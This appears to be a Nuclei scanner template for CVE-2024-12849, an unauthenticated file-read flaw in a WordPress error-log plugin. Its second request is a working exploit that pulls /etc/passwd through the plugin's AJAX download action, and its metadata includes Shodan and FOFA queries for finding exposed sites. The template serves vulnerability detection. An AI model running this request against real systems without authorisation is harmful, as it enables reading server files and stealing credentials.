flow: http(1) && http(2)
http:
- matchers:
  - dsl:
    - contains(body, "/wp-content/plugins/error-log-viewer-wp")
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - regex('root:.*:0:0:', body)
    - contains(content_type, "application/octet-stream")
    - status_code == 200
    type: dsl
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=elvwp_log_download&elvwp_error_log_download=1&elvwp_error_log=/etc/passwd

    '
id: CVE-2024-12849
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-12849
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
    epss-percentile: 0.99712
    epss-score: 0.92386
  description: 'The Error Log Viewer By WP Guru plugin for WordPress is vulnerable
    to Arbitrary File Read in all versions up to, and including, 1.0.1.3 via the wp_ajax_nopriv_elvwp_log_download
    AJAX action. This makes it possible for unauthenticated attackers to read the
    contents of arbitrary files on the server, which can contain sensitive information.

    '
  impact: 'Unauthenticated attackers can read arbitrary files on the server including
    sensitive configuration files with database credentials and other sensitive data.

    '
  metadata:
    fofa-query: body="wp-content/plugins/error-log-viewer-wp"
    framework: wordpress
    max-request: 2
    product: error-log-viewer-wp
    shodan-query: http.html:"wp-content/plugins/error-log-viewer-wp"
    vendor: wp-guru
    verified: true
  name: Error Log Viewer By WP Guru <= 1.0.1.3 - Missing Authorization to Arbitrary
    File Read
  reference:
  - https://github.com/RandomRobbieBF/CVE-2024-12849
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/57888e36-3a61-4452-b4ea-9db9e422dc2d?source=cve
  - https://nvd.nist.gov/vuln/detail/CVE-2024-12849
  - https://github.com/advisories/GHSA-899p-f2mf-g895
  remediation: 'Update Error Log Viewer By WP Guru plugin to a version newer than
    1.0.1.3.

    '
  severity: high
  tags: cve,cve2024,wordpress,wp,wp-plugin,error-log-viewer-wp,lfi,vuln
